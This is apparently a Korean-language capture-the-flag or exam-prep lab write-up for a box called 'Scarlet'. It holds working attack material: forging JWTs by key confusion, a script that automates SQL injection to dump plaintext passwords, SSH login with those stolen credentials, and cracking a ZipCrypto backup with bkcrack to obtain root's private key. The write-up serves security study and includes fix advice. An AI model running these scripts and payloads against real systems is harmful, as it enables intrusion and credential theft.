**수동 대안 — jwt_tool 이 없을 때.** 시험장 Kali 에 jwt_tool 이 깔려 있지 않을 수 있으므로 `openssl` 만으로 되는 절차를 병기함. (아래 블록은 이 박스에서 실행한 기록이 아니라 표준 절차의 재현이다.)

```bash
KEY=/tmp/nfs/essentials/public.key
b64() { openssl base64 -A | tr '+/' '-_' | tr -d '='; }   # base64url, 패딩 제거

H=$(printf '%s' '{"alg":"HS256","typ":"JWT"}' | b64)
P=$(printf '%s' '{"username":"brian","iat":1787119866}' | b64)

SIG=$(printf '%s' "$H.$P" \
  | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(xxd -p -c 999 "$KEY") -binary \
  | b64)

echo "$H.$P.$SIG"
```

함정 셋 — ① base64**url** 임(`+`→`-`, `/`→`_`, `=` 제거). 일반 base64 를 쓰면 서명이 안 맞음 ② 비밀키는 **파일의 원시 바이트**. 이 앱은 `fs.readFileSync('./public.key','utf8')` 로 PEM 텍스트를 그대로 쓴다 ③ 트레일링 개행 — `xxd -p` 결과 끝의 `0a` 유무에 따라 서명이 갈린다. 파이썬이 있으면 `jwt.encode(payload, open(KEY,'rb').read(), algorithm="HS256")` 한 줄이다.

**사용자 열거 — 위조 토큰을 오라클로 씀.** `admin` 으로 위조한 토큰은 서명은 통과했으나 그 계정이 DB 에 없었음. 포털이 존재하지 않는 사용자에게 `doesn't exist` 를 돌려주는 것이 그대로 열거 오라클이 됨.

```bash
┌──(kali㉿kali)-[~/git/jwt_tool]
└─$  python jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.CAOSvdGhpsxp6RTMguLf5wrRDsZWA-ewNHuGHW2D66Tat-sJiXl_jbJ2Wd7du_mW-GskiayTlG3FYhtm2wN5TKpavfDeHgFdJs91spCHXaUVP5TPFijeWKvI2Cf3Xf967xZP6PyjWInXB_jxVo_xGV3lM_Q_fMfbBUSQq0tKayJQgVkPVEsPmEvF-U1GRE0bj__ijqTXyrJXVv0HkXylB6g9-Gm_ersY5WKZgsRlVsnh42a550JmWguWzc6zX82lY1g7pfjOKuW7Iez5yP2DMr1v9R5kpelycbOaeNMUOpewXrUwHOV7fBtwZJEAmLosD27vW9xU_WwWd9k35oujrKovIesaMadGQ2KHPvvRyiR4HudvjRk-HLESZrFKQCY7LE-meuEiI8zvWaFTGJtAyCNkWk8CLEYCjmhtpqG8N_tqdUFWIMgyCszj8A2JedMVVMnt5LD7jHqw3Y7ki3fUEmSAwJnmZSFlCR8HZjVYVeL4b5w9MGeI5BXolhi6_RPOQPxeCT6jC5CZJmfz6KdSj8bEON5HN3Gk8It_AFQBokbxO95VFZpCdx2bySWfOX8BKIg1JRZiE-rsbwEXNGnh8ZhkBqkzJsXQ4PUOuABYsxxkpptjPrpH-xzq5nsqFzGcSHRIa2KgYZ_xQp59e3y7xYBHbLjqrsBwl_4gv__VRoo -X k -pk /tmp/nfs/essentials/public.key -I -pc username -pv admin
 ... (배너 중략) ...
/home/kali/.jwt_tool/jwtconf.ini
Original JWT:

File loaded: /tmp/nfs/essentials/public.key
jwttool_2335501e4e6161b37d7c73791d092605 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzg3MTE5ODY2fQ.DHdnhNtQCIa6E51K9N6cGsXefSrJQkXWqr9c4cb34aA
```

웹사이트에 실려 있던 사람 이름을 후보로 만들어 자동 순회함.

```bash
┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ #!/bin/bash
ORIG="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.CAOSvdGhpsxp6RTMguLf5wrRDsZWA-ewNHuGHW2D66Tat-sJiXl_jbJ2Wd7du_mW-GskiayTlG3FYhtm2wN5TKpavfDeHgFdJs91spCHXaUVP5TPFijeWKvI2Cf3Xf967xZP6PyjWInXB_jxVo_xGV3lM_Q_fMfbBUSQq0tKayJQgVkPVEsPmEvF-U1GRE0bj__ijqTXyrJXVv0HkXylB6g9-Gm_ersY5WKZgsRlVsnh42a550JmWguWzc6zX82lY1g7pfjOKuW7Iez5yP2DMr1v9R5kpelycbOaeNMUOpewXrUwHOV7fBtwZJEAmLosD27vW9xU_WwWd9k35oujrKovIesaMadGQ2KHPvvRyiR4HudvjRk-HLESZrFKQCY7LE-meuEiI8zvWaFTGJtAyCNkWk8CLEYCjmhtpqG8N_tqdUFWIMgyCszj8A2JedMVVMnt5LD7jHqw3Y7ki3fUEmSAwJnmZSFlCR8HZjVYVeL4b5w9MGeI5BXolhi6_RPOQPxeCT6jC5CZJmfz6KdSj8bEON5HN3Gk8It_AFQBokbxO95VFZpCdx2bySWfOX8BKIg1JRZiE-rsbwEXNGnh8ZhkBqkzJsXQ4PUOuABYsxxkpptjPrpH-xzq5nsqFzGcSHRIa2KgYZ_xQp59e3y7xYBHbLjqrsBwl_4gv__VRoo"
for u in brian.harper brianharper bharper brian harper b.harper brian_harper brianh will.johnson willjohnson wjohnson austin.carter acarter; do
  TOKEN=$(python /home/kali/git/jwt_tool/jwt_tool.py "$ORIG" -X k -pk /tmp/nfs/essentials/public.key -I -pc username -pv "$u" 2>/dev/null | grep -oP '(?<=\[\+\] )ey[A-Za-z0-9._-]+')
  RESP=$(curl -s http://scarlet.local/portal -H "Cookie: session=$TOKEN")
  if ! echo "$RESP" | grep -q "doesn't exist"; then
    echo "[+] VALID: $u"
  else
    echo "[-] $u"
  fi
done
[-] brian.harper
[-] brianharper
[-] bharper
[+] VALID: brian
[-] harper
[-] b.harper
[-] brian_harper
[-] brianh
[-] will.johnson
[-] willjohnson
[-] wjohnson
[-] austin.carter
[-] acarter
```
— 출처: `~/.zsh_history`(스크립트 원문) · 출력은 원 세션 캡처

`[가정]` 후보 이름 `brian.harper`·`will.johnson`·`austin.carter` 의 출처는 기록에 없음. Mobirise 템플릿 사이트 본문(팀 소개 섹션)에서 뽑은 것으로 보임. `zsh_history` 에는 `username-anarchy -i scarlet-name.txt` 로 변형을 생성한 흔적도 남아 있다.

**결과는 `brian` 하나.** 그리고 `brian` 토큰으로 포털을 열어도 관리 기능도 새 정보도 없었다 — 인증 우회는 성공했으나 얻은 것이 없는 상태.

**클레임을 인젝션 지점으로 재해석.** `username` 에 작은따옴표 하나를 넣음.

```bash
┌──(kali㉿kali)-[~/git/jwt_tool]
└─$ ORIG="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.CAOSvdGhpsxp6RTMguLf5wrRDsZWA-ewNHuGHW2D66Tat-sJiXl_jbJ2Wd7du_mW-GskiayTlG3FYhtm2wN5TKpavfDeHgFdJs91spCHXaUVP5TPFijeWKvI2Cf3Xf967xZP6PyjWInXB_jxVo_xGV3lM_Q_fMfbBUSQq0tKayJQgVkPVEsPmEvF-U1GRE0bj__ijqTXyrJXVv0HkXylB6g9-Gm_ersY5WKZgsRlVsnh42a550JmWguWzc6zX82lY1g7pfjOKuW7Iez5yP2DMr1v9R5kpelycbOaeNMUOpewXrUwHOV7fBtwZJEAmLosD27vW9xU_WwWd9k35oujrKovIesaMadGQ2KHPvvRyiR4HudvjRk-HLESZrFKQCY7LE-meuEiI8zvWaFTGJtAyCNkWk8CLEYCjmhtpqG8N_tqdUFWIMgyCszj8A2JedMVVMnt5LD7jHqw3Y7ki3fUEmSAwJnmZSFlCR8HZjVYVeL4b5w9MGeI5BXolhi6_RPOQPxeCT6jC5CZJmfz6KdSj8bEON5HN3Gk8It_AFQBokbxO95VFZpCdx2bySWfOX8BKIg1JRZiE-rsbwEXNGnh8ZhkBqkzJsXQ4PUOuABYsxxkpptjPrpH-xzq5nsqFzGcSHRIa2KgYZ_xQp59e3y7xYBHbLjqrsBwl_4gv__VRoo"

┌──(kali㉿kali)-[~/git/jwt_tool]
└─$ python jwt_tool.py "$ORIG" -X k -pk /tmp/nfs/essentials/public.key -I -pc username -pv "brian'"
 ... (배너 중략) ...
File loaded: /tmp/nfs/essentials/public.key
jwttool_4b7e45322c4a8c1369bbc897802941d9 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJyaWFuJyIsImlhdCI6MTc4NzExOTg2Nn0.dtHpmGbUz1bqiGIEA0JRFMQoR6YDwrxQzuVMiCK5idI

┌──(kali㉿kali)-[~/git/jwt_tool]
└─$ curl -s http://scarlet.local/portal -H "Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJyaWFuJyIsImlhdCI6MTc4NzExOTg2Nn0.dtHpmGbUz1bqiGIEA0JRFMQoR6YDwrxQzuVMiCK5idI"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: SQLITE_ERROR: unrecognized token: "'brian''"</pre>
</body>
</html>
```

이 한 줄이 셋을 동시에 확정 — ① DBMS 는 SQLite(`SQLITE_ERROR`) ② 작은따옴표 문자열 컨텍스트(`'brian''` — 넣은 `'` 가 닫는 따옴표 뒤에 붙어 열린 채로 남음) ③ 에러가 응답에 그대로 실림.

**수동 UNION 덤프.** sqlmap 은 시험 금지이고, 여기서는 애초에 못 쓴다 — 파라미터를 변조할 때마다 JWT 를 재서명해야 해서 `--eval` 훅이나 프록시 스크립트 없이는 성립하지 않는다. 아래는 자동 익스플로잇 도구가 아니라 **수동 페이로드를 반복 전송하는 래퍼**다.

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ cat scarlet_all.sh
#!/bin/bash
# scarlet_all.sh — JWT key-confusion SQLi 전자동 덤프
ORIG="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.CAOSvdGhpsxp6RTMguLf5wrRDsZWA-ewNHuGHW2D66Tat-sJiXl_jbJ2Wd7du_mW-GskiayTlG3FYhtm2wN5TKpavfDeHgFdJs91spCHXaUVP5TPFijeWKvI2Cf3Xf967xZP6PyjWInXB_jxVo_xGV3lM_Q_fMfbBUSQq0tKayJQgVkPVEsPmEvF-U1GRE0bj__ijqTXyrJXVv0HkXylB6g9-Gm_ersY5WKZgsRlVsnh42a550JmWguWzc6zX82lY1g7pfjOKuW7Iez5yP2DMr1v9R5kpelycbOaeNMUOpewXrUwHOV7fBtwZJEAmLosD27vW9xU_WwWd9k35oujrKovIesaMadGQ2KHPvvRyiR4HudvjRk-HLESZrFKQCY7LE-meuEiI8zvWaFTGJtAyCNkWk8CLEYCjmhtpqG8N_tqdUFWIMgyCszj8A2JedMVVMnt5LD7jHqw3Y7ki3fUEmSAwJnmZSFlCR8HZjVYVeL4b5w9MGeI5BXolhi6_RPOQPxeCT6jC5CZJmfz6KdSj8bEON5HN3Gk8It_AFQBokbxO95VFZpCdx2bySWfOX8BKIg1JRZiE-rsbwEXNGnh8ZhkBqkzJsXQ4PUOuABYsxxkpptjPrpH-xzq5nsqFzGcSHRIa2KgYZ_xQp59e3y7xYBHbLjqrsBwl_4gv__VRoo"
JT="/home/kali/git/jwt_tool/jwt_tool.py"
PK="/tmp/nfs/essentials/public.key"
URL="http://scarlet.local/portal"

# username 자리에 payload 주입 → 1번 컬럼 반사값만 추출
inject() {
  local token
  token=$(python "$JT" "$ORIG" -X k -pk "$PK" -I -pc username -pv "$1" 2>/dev/null | grep -oP '(?<=\[\+\] )ey[A-Za-z0-9._-]+')
  curl -s "$URL" -H "Cookie: session=$token" | grep -oP '(?<=<strong>Hey ).*?(?=, <br>)'
}

echo "=== [1] 전체 스키마 (모든 테이블 CREATE 문) ==="
inject "zzz' UNION SELECT group_concat(sql,' ||| '),2,3 FROM sqlite_master WHERE type='table'-- -"

echo -e "\n=== [2] 테이블 이름 목록 ==="
TABLES=$(inject "zzz' UNION SELECT group_concat(name,' '),2,3 FROM sqlite_master WHERE type='table'-- -")
echo "$TABLES"

echo -e "\n=== [3] users로 추정되는 테이블 전체 덤프 시도 ==="
# 흔한 사용자 테이블/컬럼 조합 자동 순회
for tbl in users user accounts members authors admin; do
  for pair in "username||':'||password" "user||':'||pass" "name||':'||password" "email||':'||password" "username||':'||pass"; do
    res=$(inject "zzz' UNION SELECT group_concat($pair,'  '),2,3 FROM $tbl-- -")
    if [ -n "$res" ] && ! echo "$res" | grep -qi "error\|no such"; then
      echo "[+] $tbl ($pair):"
      echo "    $res"
    fi
  done
done

echo -e "\n=== [4] 위에서 안 나오면 [1]의 스키마를 보고 수동으로 컬럼명 맞춰야 함 ==="
```
— 출처: `~/PG/Scarlet/scarlet_all.sh`

`inject()` 가 「페이로드 → 서명 → 전송 → 반사값 추출」을 한 줄로 압축함. 인젝션 지점이 토큰 안에 있을 때의 핵심 추상화라 이 형태를 그대로 시험에 가져갈 것. `grep -oP '(?<=<strong>Hey ).*?(?=, <br>)'` 의 반사 지점은 실제 템플릿의 `<h3 ...><strong>Hey {{ user.username }}, <br>Wanna Publish a book ?</strong></h3>` 이다(복호화한 `web/views/portal.html:73`).

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ ./scarlet_all.sh
=== [1] 전체 스키마 (모든 테이블 CREATE 문) ===

=== [2] 테이블 이름 목록 ===
users sqlite_sequence

=== [3] users로 추정되는 테이블 전체 덤프 시도 ===
[+] users (username||':'||password):
    brian:Standingbytheseaside12  4leaf:password1

=== [4] 위에서 안 나오면 [1]의 스키마를 보고 수동으로 컬럼명 맞춰야 함 ===
```

`[1]` 스키마 추출은 빈 결과로 실패했고 `[3]` 의 폴백이 답을 냄.

최종 페이로드를 조각내면 이렇다.

```sql
zzz' UNION SELECT group_concat(username||':'||password,'  '),2,3 FROM users-- -
```

| 조각 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `zzz'` | 원 쿼리를 빈 결과로 만들고 문자열을 닫음. `zzz` 라는 사용자는 없음 | 실제 사용자명을 쓰면 원 결과가 1행 반환돼 UNION 결과가 화면에 안 보임(첫 행만 렌더) |
| `group_concat(...)` | 여러 행을 한 문자열로 압축. 화면에 한 줄만 반사되므로 필수 | 첫 행 하나만 얻음 |
| `username\|\|':'\|\|password` | SQLite 의 문자열 연결 연산자는 `\|\|` | MySQL 식 `CONCAT()` 은 SQLite 3.44.0(2023-11-01) 미만에 함수 자체가 없어 `no such function: concat` 이 남 — 이 박스(Ubuntu 22.04, sqlite 3.37)가 그 경우. `+` 를 쓰면 숫자 덧셈이 돼 `0` 이 나옴 |
| `,'  '` | `group_concat` 구분자를 공백 2칸으로 지정(기본은 `,`) | 값에 콤마가 있으면 파싱이 헷갈림 |
| `,2,3` | 컬럼 수를 원 쿼리와 맞춤 | 개수가 다르면 `SELECTs to the left and right of UNION do not have the same number of result columns` |
| `-- -` | 뒤에 남은 원 쿼리를 주석 처리 | 문법 오류 |

`[가정]` 컬럼 수 3 을 어떻게 확정했는지는 기록이 없음. 표준 절차는 `' ORDER BY N-- -` 이진 탐색이나 `UNION SELECT 1,2,3-- -` 로 개수를 늘려가는 것이고, 후자는 컬럼 수와 반사 위치를 한 번에 준다.

**획득: `brian` / `Standingbytheseaside12` — 해시가 아니라 평문임.** 평문 저장은 「이 시스템은 보안을 신경 쓰지 않았다」는 신호이므로 덤프 직후 반사적으로 OS 계정 재사용을 시험할 것.

```bash
┌──(kali㉿kali)-[~]
└─$ ssh brian@192.168.248.222
The authenticity of host '192.168.248.222 (192.168.248.222)' can't be established.
ED25519 key fingerprint is: SHA256:EcFUQ3abooLm3ZmBChJ1yx8VqJ5nj/Htk22+PfBdxUo
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.248.222' (ED25519) to the list of known hosts.
brian@192.168.248.222's password:
Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-41-generic x86_64)
 ... (MOTD 중략) ...
  System information as of Wed Aug 19 07:15:36 AM UTC 2026

  System load:  0.0               Processes:               231
  Usage of /:   59.4% of 9.75GB   Users logged in:         0
  Memory usage: 35%               IPv4 address for ens160: 192.168.248.222
  Swap usage:   0%
 ... (중략) ...
*** System restart required ***
 ... (중략) ...
$ ls
local.txt  web
$ cat lo
cat: lo: No such file or directory
$ cat local.txt
95d749deeb0864d9ebd76f2e212788b7
```

프롬프트가 `$` 뿐 — 로그인 셸이 `sh` 계열이라 탭 완성·히스토리가 없음(`cat lo` 오타의 원인). SSH 는 이미 PTY 를 갖고 있으므로 `pty.spawn` 이 아니라 `/bin/bash -i` 한 줄이면 올라감.

**Local.txt value:**
`95d749deeb0864d9ebd76f2e212788b7`

⚠️ 증거는 위 세션 캡처뿐이다. `whoami; id; hostname; hostname -I; date; cat local.txt` 를 한 화면에 묶은 `proof_user.txt` 파일도, 스크린샷도 남기지 않았다 — 시험 형식으로는 미달인 기록임.

### Privilege Escalation – ZipCrypto known-plaintext 로 백업 복호화 → root SSH 개인키

**Vulnerability Explanation:**
- `/opt/backup.zip`(3.5MB, `brian brian`, `-rw-r--r--`)이 전통 zip 암호(ZipCrypto, PKWARE 1990)로 암호화됨. 96비트 내부 상태(`key0/key1/key2`)를 쓰는 스트림 암호이고, 1994년 Biham–Kocher 의 known-plaintext 공격으로 **비밀번호를 거치지 않고 내부 키를 직접 복구**할 수 있음
- 복구되는 것은 비밀번호가 아니라 내부 키이고, 그 키는 **아카이브 전체에 공통**이라 엔트리 하나의 평문만 알면 나머지 전부가 풀림
- 그 엔트리가 `web/public.key` — NFS 에서 이미 확보한 것과 동일 파일(둘 다 800바이트). 즉 초기 접근에 쓴 아티팩트가 그대로 권한상승 재료가 됨
- 아카이브 안에 `ssh-keys/id_rsa` 가 평문으로 들어 있고 코멘트가 `root@scarlet` 이며, 타겟이 root SSH 키 로그인을 허용함

**Vulnerability Fix:**
- 백업을 대상 호스트에 두지 말 것. 부득이하면 `chmod 600 root:root` + 별도 볼륨 + 정기 삭제
- ZipCrypto 를 쓰지 말 것 — AES-256 zip(`7z a -tzip -mem=AES256`) 또는 GPG/age
- SSH 개인키를 백업에 포함하지 말 것. 유출 정황이 있으면 즉시 로테이션
- `PermitRootLogin no` — 관리 접근은 일반 계정 + `sudo` 로

**Severity:** Critical — 로컬 사용자 권한만으로 읽히는 백업 하나가 root 개인키를 그대로 내줌

**Steps to reproduce the attack:**
1. `ls -la /opt /srv /var/www` 로 `/opt/backup.zip` 발견
2. `zipfile.namelist()` 로 목록 확인 — 암호 없이 읽힘. `web/public.key` 가 이미 가진 파일임을 확인
3. `scp` 로 Kali 로 내림
4. `python3 bkcrack/tools/deflate.py < public.key > pub.deflate` 로 평문을 deflate 스트림으로 변환
5. `bkcrack -C backup.zip -c web/public.key -p pub.deflate` → 내부 키 3개 복구
6. `bkcrack -k <키3개> -D decrypted.zip` → `unzip` → `ssh-keys/id_rsa`
7. `chmod 600` 후 `ssh -i <키> root@192.168.248.222`

**표준 열거는 전부 공회전 — 그 사실 자체가 정보임.**

```bash
brian@scarlet:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/mnt/share *(rw,sync,no_subtree_check)
```

**`no_root_squash` 가 없다** → 기본값 `root_squash` 적용. SUID 바이너리를 심어도 root 소유로 기록되지 않으므로 고전 NFS 권한상승 경로는 닫힘. 이 NFS 의 가치는 순수한 읽기였고 그것만으로 충분했음.

```bash
brian@scarlet:~$ find / -perm -4000 -type f 2>/dev/null
/snap/snapd/16010/usr/lib/snapd/snap-confine
/snap/snapd/16292/usr/lib/snapd/snap-confine
 ... (snap/core20 하위 22개 중략 — 전부 배포판 기본) ...
/usr/libexec/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/sudo
/usr/sbin/mount.nfs
```

전부 Ubuntu 22.04 기본 SUID 이고 커스텀 바이너리가 하나도 없다 → SUID 경로 없음. `pkexec` 가 보이지만 Ubuntu 22.04 는 출시 시점에 PwnKit(CVE-2021-4034)이 이미 패치돼 있어 여기서는 통하지 않는다.

```bash
brian@scarlet:~$ getcap -r / 2>/dev/null
/snap/core20/1611/usr/bin/ping cap_net_raw=ep
/snap/core20/1518/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
```

`cap_net_raw` 뿐 — 권한상승용이 아님. 위험한 것은 `cap_setuid`(즉시 root) · `cap_dac_read_search`(임의 파일 읽기) · `cap_sys_admin` · `cap_sys_ptrace` 이고 하나도 없음.

```bash
brian@scarlet:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
brian@scarlet:~$ ls -la /etc/cron.d/ 2>/dev/null
total 16
drwxr-xr-x   2 root root 4096 Jun 16  2022 .
drwxr-xr-x 104 root root 4096 Feb 20  2025 ..
-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
```

전부 기본값 — 크론 경로도 닫힘. ⚠️ **`id` 와 `sudo -l` 은 기록이 남아 있지 않음.** 결과적으로 다른 경로가 있었으나 순서상 첫 번째로 쳤어야 하는 명령임.

**정답은 파일시스템에 있었음.**

```bash
brian@scarlet:~$ ps aux | grep -i node | grep -v grep
find / -name "app.js" -o -name "server.js" 2>/dev/null | grep -vE "node_modules|snap"
find / -name "*.db" -o -name "*.sqlite*" 2>/dev/null | grep -v snap
ls -la /var/www /opt /srv 2>/dev/null
brian       1199  2.0  3.3 915192 68716 ?        Ssl  02:16   6:19 node /home/brian/web/index.js
 ... (/var/cache/man/*/index.db 25개 중략 — man 페이지 캐시 노이즈) ...
/var/lib/command-not-found/commands.db
/var/lib/PackageKit/transactions.db
/usr/share/mime/application/vnd.sqlite3.xml
/usr/lib/firmware/regulatory.db
/home/brian/web/database.db
/opt:
total 3484
drwxr-xr-x  2 root  root     4096 Jul 18  2022 .
drwxr-xr-x 19 root  root     4096 Jun 15  2022 ..
-rw-r--r--  1 brian brian 3557636 Jul 17  2022 backup.zip

/srv:
total 8
drwxr-xr-x  2 root root 4096 Apr 21  2022 .
drwxr-xr-x 19 root root 4096 Jun 15  2022 ..

/var/www:
total 12
drwxr-xr-x  3 root root 4096 Jul 18  2022 .
drwxr-xr-x 14 root root 4096 Jul 18  2022 ..
drwxr-xr-x  2 root root 4096 Jul 18  2022 html
```

| 발견 | 의미 |
|---|---|
| `node /home/brian/web/index.js` — brian 권한 구동 | 웹앱이 root 가 아님. 웹 RCE 를 얻어도 brian 일 뿐, 이미 가진 권한임 |
| `/home/brian/web/database.db` | SQLi 로 덤프한 그 SQLite 파일. 이제 직접 읽을 수 있음 |
| `/opt/backup.zip` 3.5MB, `brian brian` | 시스템 기본 파일이 아님 — 의도적으로 배치된 것 |

**zip 은 암호가 걸려 있어도 파일 목록은 읽힘** — 중앙 디렉터리가 암호화되지 않기 때문.

```bash
brian@scarlet:/tmp/bk$ python3 -c "import zipfile; z=zipfile.ZipFile('backup.zip'); print('\n'.join(z.namelist()))" | head -60
ssh-keys/
ssh-keys/id_rsa
web/
web/middleware/
web/middleware/AuthMiddleware.js
web/css/
web/css/style.css
web/scarlet.local
web/public.key
web/index.js
web/default
web/private.key
web/package.json
web/views/
web/views/index.html
web/views/login.html
web/views/portal.html
web/assets/
web/assets/smoothscroll/
 ... (assets 하위 정적 파일 40여 개 중략) ...
web/assets/socicon/
web/assets/socicon/css/
```

첫 두 줄이 답이고(`ssh-keys/id_rsa`), `web/public.key` 가 NFS 에서 이미 확보한 바로 그 파일임. **이 순간 known-plaintext 의 재료가 갖춰진다.** `web/private.key` 도 들어 있다 — JWT 서명용 RSA 개인키이고, 순서가 반대였다면(먼저 zip 을 풀었다면) 키 혼동 없이 정상 RS256 토큰을 발행하는 것이 정공법이었을 것.

**평문은 «압축된 상태»로 줘야 함.** zip 엔트리는 보통 deflate 로 압축한 뒤 암호화하므로 bkcrack 에 넘길 known-plaintext 는 원본이 아니라 동일한 deflate 스트림이어야 함. `unzip -v` 의 `Method` 컬럼이 그 판정 근거임.

```text
 Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
--------  ------  ------- ---- ---------- ----- --------  ----
    2602  Defl:N     1976  24% 2022-07-16 19:58 d8e5711b  ssh-keys/id_rsa
     460  Defl:N      214  54% 2022-04-16 16:21 41484238  web/scarlet.local
     800  Defl:N      630  21% 2022-04-03 20:17 a6288c75  web/public.key
```
— 출처: `unzip -v ~/PG/Scarlet/backup.zip`(사후 재실행). `Defl:N` = deflate 압축 → 전처리 필요. `Stored` 였다면 원본 파일을 그대로 주면 됨

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ scp brian@192.168.248.222:/opt/backup.zip .
brian@192.168.248.222's password:
backup.zip                                                          100% 3474KB   1.4MB/s   00:02

┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ cd ~/git/bkcrack/build/src/cli

┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ ls ~/git/bkcrack/tools/
deflate.py  inflate.py

┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ python3 ~/git/bkcrack/tools/deflate.py < /tmp/nfs/essentials/public.key > pub.deflate

┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ ./bkcrack -C ~/PG/Scarlet/backup.zip -c web/public.key -p pub.deflate
bkcrack 1.8.1 - 2025-10-25
[16:32:24] Z reduction using 623 bytes of known plaintext
100.0 % (623 / 623)
[16:32:24] Attack on 14181 Z values at index 10
Keys: c45cce0e 772c014e 98bbd8be
32.3 % (4575 / 14181)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 4575
[16:32:29] Keys
c45cce0e 772c014e 98bbd8be
```

**5초.** 3.5MB 아카이브의 비밀번호를 몰라도 내부 키가 나옴.

| 플래그 | 의미 | 주의점 |
|---|---|---|
| `-C <파일>` | 대상 암호화 zip | — |
| `-c <엔트리>` | 아카이브 안의 어느 엔트리를 아는가 | `unzip -l` 의 이름과 완전 일치해야 함 |
| `-p <파일>` | 알려진 평문. 엔트리가 deflate 면 deflate 된 것을 준다 | 최대 함정. 원본을 그냥 주면 실패 |
| `-o <오프셋>` | 평문이 엔트리의 몇 바이트째부터 일치하는지 | 부분 평문(헤더만 아는 경우) |
| `-k k0 k1 k2` | 복구된 내부 키로 복호화 | — |
| `-D <출력>` | 암호를 제거한 새 zip 을 쓴다 | `-U <출력> <새암호>` 는 재암호화 |

출력 읽는 법 — `Z reduction using 623 bytes` 의 623 은 파일 크기가 아니다. 넘긴 `pub.deflate` 는 630바이트이고 623 은 Z reduction 에 실제로 쓴 값의 개수(= 630 − contiguousSize(8) + 1)다. 요구 평문 길이는 **논문(Biham–Kocher) 13바이트 · bkcrack 구현 12바이트**로 수치가 다르므로 섞어 인용하지 말 것.

```bash
┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ ./bkcrack -C ~/PG/Scarlet/backup.zip \
  -k c45cce0e 772c014e 98bbd8be \
  -D decrypted.zip
bkcrack 1.8.1 - 2025-10-25
[16:33:10] Writing decrypted archive decrypted.zip
100.0 % (53 / 53)

┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ unzip decrypted.zip -d out
Archive:  decrypted.zip
   creating: out/ssh-keys/
  inflating: out/ssh-keys/id_rsa
   creating: out/web/
   creating: out/web/middleware/
  inflating: out/web/middleware/AuthMiddleware.js
 ... (정적 자산 40여 개 중략) ...
